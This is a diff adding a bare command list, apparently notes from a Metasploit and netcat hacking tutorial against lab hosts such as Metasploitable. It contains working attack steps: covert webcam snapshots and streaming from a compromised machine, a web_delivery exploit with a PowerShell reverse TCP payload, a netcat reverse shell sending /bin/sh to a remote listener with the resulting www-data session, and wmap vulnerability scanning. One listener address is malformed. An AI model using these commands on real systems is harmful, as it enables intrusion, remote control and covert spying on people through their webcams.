@@ -1,0 +1,46 @@
+msfconsole
+
+webcam_list
+webcam_snap
+run webcam -p /var/www
+
+use exploit/multi/script/web_delivery
+set LHOST 192.1681.153
+set LPORT 4444
+set URIPATH powersploit
+set target 2
+set payload windows/powershell_reverse_tcp
+sessions -l
+sessions -l 1
+PS C: \Users\OTW > Get-Process
+
+nc -l -p 1234
+nc 172.16.1.100 1234 -e /bin/sh
+nc -l -p 1234
+whoami
+www-data
+nc -l -p 1234
+whoami
+www-data
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+ps
+
+msfdb init
+service postgresql start
+msfconsole
+db_status
+load wmap
+?
+wmap_sites
+wmap_sites -a http://172.16.1.102
+wmap_sites -l
+wmap_targets
+wmap_targets -l
+wmap_run
+wmap_run -t
+wmap_vulns -l
+
+
+   
+
